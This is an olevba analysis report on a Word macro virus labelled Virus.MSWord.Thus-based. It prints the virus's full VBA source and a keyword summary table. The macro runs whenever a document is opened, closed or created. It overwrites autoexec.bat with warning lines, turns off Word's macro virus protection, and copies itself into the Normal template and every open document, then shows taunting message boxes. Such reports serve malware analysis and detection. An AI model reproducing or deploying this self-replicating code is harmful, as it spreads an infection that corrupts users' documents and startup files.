olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-4fa87f9c75327fa752879c9802ce0a94504e5c5d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-4fa87f9c75327fa752879c9802ce0a94504e5c5d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'ÏÐÈÂÅÒ'
Dim s(500) As String
Open "c:\autoexec.bat" For Input As #1
For I = 1 To 500
If EOF(1) Then GoTo 15
Input #1, s(I)
If I = 1 Then
    If s(I) = "Attention: The Virus is on your computer" Then
    GoTo 25
    End If
End If
Next
15:
Close (1)
Open "c:\autoexec.bat" For Output As #1

Print #1, "Attention: The Virus is on your computer"
Print #1, "Restart your computer"
Print #1, "Pause"
For j = 1 To I
Print #1, s(j)
Next

25:
Close (1)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "ÏÐÈÂÅÒ!"
    .Subject = "ß - ÂÈÐÓÑ!"
    .Comments = "ÇÀÐÅÃÈÑÒÐÈÐÓÉ ÊÎÏÈÞ ÄÀÍÍÎÃÎ ÂÈÐÓÑÀ!"
    .Execute
End With

On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'ÏÐÈÂÅÒ'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'ÏÐÈÂÅÒ'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Application.ActiveDocument.Save
    Next k
MsgBox ( _
"               /-\ " + Chr$(13) + _
"              |-----| " + Chr$(13) + _
"              |     | " + Chr$(13) + _
"              |     | " + Chr$(13) + _
"              |     | " + Chr$(13) + _
"    / \ / \|     |/ \ / \ " + Chr$(13) + _
"   |    |                |     | " + Chr$(13) + _
"   |                           | " + Chr$(13) + _
"   |                           | " + Chr$(13) + _
"    \                        / " + Chr$(13) + _
"     \                     / " + Chr$(13) + _
"      \_________/" + Chr$(13) + _
"     What the Hell is it")
                
MsgBox ( _
"               /-\ " + Chr$(13) + _
"              |-----| " + Chr$(13) + _
"              |     | " + Chr$(13) + _
"              |     | " + Chr$(13) + _
"              |     | " + Chr$(13) + _
"    / \ / \|     |/ \ / \ " + Chr$(13) + _
"   |    |                |     | " + Chr$(13) + _
"   |                           | " + Chr$(13) + _
"   |                           | " + Chr$(13) + _
"    \                        / " + Chr$(13) + _
"     \                     / " + Chr$(13) + _
"      \_________/" + Chr$(13) + _
"     Am I VIRUS Stupid")

End Sub
Private Sub Document_Close()
On Error Resume Next
    Document_Open
End Sub
Private Sub Document_New()
On Error Resume Next
    Document_Open
End Sub

































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

